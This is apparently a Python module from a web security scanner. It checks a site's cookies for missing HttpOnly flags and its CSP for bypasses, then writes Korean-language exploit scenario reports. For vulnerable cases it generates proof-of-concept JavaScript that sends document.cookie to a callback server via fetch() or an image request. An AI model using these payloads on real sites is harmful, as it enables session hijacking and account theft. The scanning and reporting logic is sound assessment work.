from typing import Optional, Dict, List
from data_models import FinalReportData, ExploitScenario, IExploitCheck, CookieInfo
from csp_check import CSPCheck

class CookieTheftCheck(IExploitCheck):
    def check(self, data: FinalReportData, callback_server: str) -> Optional[ExploitScenario]:
        all_cookies: List[CookieInfo] = data.defenses.all_cookies
        csp_rules = data.defenses.csp_rules

        if not all_cookies:
            return None

        leakable_cookies = [c.name for c in all_cookies if not c.has_httponly]
        protected_cookies = [c.name for c in all_cookies if c.has_httponly]

        if not leakable_cookies:
            return ExploitScenario(
                scenario_name="쿠키 탈취",
                is_possible=False,
                severity="Info",
                des=f"모든 쿠키({protected_cookies})에 'HttpOnly' 플래그가 설정되어 있습니다."
            )
        
        if csp_rules:
            (is_bypassable, vulnerable_reasons) = CSPCheck.csp_check(csp_rules, callback_server)
            
            if is_bypassable:
                vulnerabilities_str = " ".join(vulnerable_reasons) 
                
                des_csp_part = f"CSP 정책이 우회 가능합니다. (우회 가능 정책 : {vulnerabilities_str})"
                poc_code = ""

                if "'connect-src'" in vulnerabilities_str:
                    poc_code = f"fetch('{callback_server}/?cookies='+document.cookie)"
                elif "'img-src'" in vulnerabilities_str:
                    poc_code = f"new Image().src='{callback_server}/?cookies='+document.cookie"
                else:
                    poc_code = None

                return ExploitScenario(
                    scenario_name="쿠키 탈취 (세션 하이재킹)",
                    is_possible=True,
                    severity="High",
                    des=f"{des_csp_part}\n탈취 가능 쿠키: {leakable_cookies}.",
                    poc_code=poc_code
                )
            
            else:
                return ExploitScenario(
                    scenario_name="쿠키 탈취",
                    is_possible=False,
                    severity="Info",
                    des=f"강력한 CSP 정책이 쿠키 탈취를 차단합니다.\n'HttpOnly'가 없는 쿠키({leakable_cookies})가 있지만 안전합니다."
                )
        
        poc_code = f"fetch('{callback_server}/?cookies='+document.cookie)" 
        return ExploitScenario(
            scenario_name="쿠키 탈취 (세션 하이재킹)",
            is_possible=True,
            severity="Medium",
            des=f"CSP 정책이 설정되지 않았습니다.\n탈취 불가 쿠키: {protected_cookies}.\n 탈취 가능 쿠키: {leakable_cookies}.",
            poc_code=poc_code
        )